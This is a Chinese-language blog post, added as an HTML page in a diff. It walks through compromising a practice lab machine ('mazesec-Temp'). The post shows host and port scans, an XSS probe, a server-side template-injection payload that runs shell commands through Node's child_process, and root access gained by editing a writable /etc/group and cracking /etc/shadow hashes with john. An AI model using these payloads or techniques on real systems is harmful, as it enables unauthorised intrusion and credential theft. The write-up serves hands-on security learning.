@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>mazesec-Temp · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-07-30">2025年7月30日</time>
+        
+        
+          <span class="post__readtime">6 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/Maze/">#Maze</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">mazesec-Temp</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>心一跳爱就开始煎熬</p>
+<p>每一份每一秒</p>
+<p>火在烧烧成灰有多好</p>
+<p>叫思念不要吵</p>
+<p>我相信我已经快要</p>
+<p>快要把你忘掉</p>
+<p>跟寂寞再和好</p>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p><strong>主机发现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/bin]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24                                                               </span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:04       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:6e:db:e2       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.149  08:00:27:80:50:ab       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.365 seconds (108.25 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/bin]</span><br><span class="line">└─# nmap -sC -sV -p 22,80,3000 192.168.56.149</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 04:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.149</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span><br><span class="line">|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span><br><span class="line">|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.62 ((Debian))</span><br><span class="line">|_http-title: Safe Welcome Center</span><br><span class="line">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="line">3000/tcp open  http    Node.js (Express middleware)</span><br><span class="line">|_http-title: Welcome Center</span><br><span class="line">MAC Address: 08:00:27:80:50:AB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.96 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong>80端口</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301706983.png" alt="image-20250730170651906"></p>
+<p><strong>3000端口</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301707046.png" alt="image-20250730170708966"></p>
+<p>两个端口的服务咋一看一模一样</p>
+<p>细看标题中有个Safe的区别(第一眼没看到Safe 我以为两个网站一样呢)</p>
+<p>然后就随手一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>上去了</p>
+<p>80端口不能插入</p>
+<p>3000端口可以被插入</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301709341.png" alt="image-20250730170950297"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301709482.png" alt="image-20250730170944394"></p>
+<p>最开始我想着如何如打这个xss</p>
+<p>不过进一步信息收集 没找到能进一步利用xss的点</p>
+<p>然后就转向了 模板注入</p>
+<p>在3000端口输入<code>&lt;%= test %&gt;</code>的时候</p>
+<p>报错了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301712713.png" alt="image-20250730171240655"></p>
+<p>然后找了一些payload来实现rce找了一个<code>&lt;&lt;%= this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -al /&#39;).toString() %&gt;</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301714890.png" alt="image-20250730171406772"></p>
+<p>然后就拿到了<code>welcome</code>用户的权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301715058.png" alt="image-20250730171515000"></p>
+<h2 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h2><p>写了一个公钥ssh连上去了</p>
+<p><code>sudo -l </code></p>
+<p>查看可以执行<code>sudo /usr/sbin/reboot</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301716202.png" alt="image-20250730171602094"></p>
+<p>其实我最开始看到这里的时候</p>
+<p>我是想着是可能会有一些服务文件 可以进行写&#x2F;修改的</p>
+<p>然后重启机器 导致这些服务文件自动加载中，从而导致提权</p>
+<p>然后我就按照这样的想法去做了</p>
+<p>结果当时是没做出来。</p>
+<p>然后继续信息收集 </p>
+<p>发现了 对 <code>/etc/group</code>文件有写的权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301722534.png" alt="image-20250730172232493"></p>
+<p>由于最前端时间有个靶机就是利用<code>disk</code>用户组的用户去读<code>/root</code>下面的文件的</p>
+<p>所以就加了<code>disk</code>用户组</p>
+<p>但是加了<code>disk</code>用户组之后</p>
+<p>我忘记用什么命令可以对磁盘进行调试了</p>
+<p>后来找到了是用<code>debugfs</code>命令</p>
+<p>但是没有这个命令 </p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301726403.png" alt="image-20250730172626329"></p>
+<blockquote>
+<p>打完之后才知道有这个工具, 只是没在welcome用户的PATH中</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301727260.png" alt="image-20250730172744223"></p>
+</blockquote>
+<p>然后我就又加了 <code>sudo 、 shadow</code>组</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301728763.png" alt="image-20250730172844718"></p>
+<p>之后从<code>/etc/shadow</code>查看用户的密码</p>
+<p>然后用john对密码进行爆破</p>
+<p>得到了<code>welcome</code>的密码<code>sainsburys</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301729274.png" alt="image-20250730172937218"></p>
+<p>然后也是利用<code>sudo -i</code>成功提到了root</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507301730073.png" alt="image-20250730173016025"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-11-19">2025·11·19</time>
+          <a class="related__link" href="/2025/11/19/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Horse/">mazesec-Horse</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-11-09">2025·11·09</time>
+          <a class="related__link" href="/2025/11/09/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-BabyShell/">mazesec-BabyShell</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-05-06">2025·05·06</time>
+          <a class="related__link" href="/2025/05/06/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-awker/">mazesec-awker</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">mazesec-Motto</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/07/28/CVE/cve-2024-39930/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">CVE-2024-39930复现</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
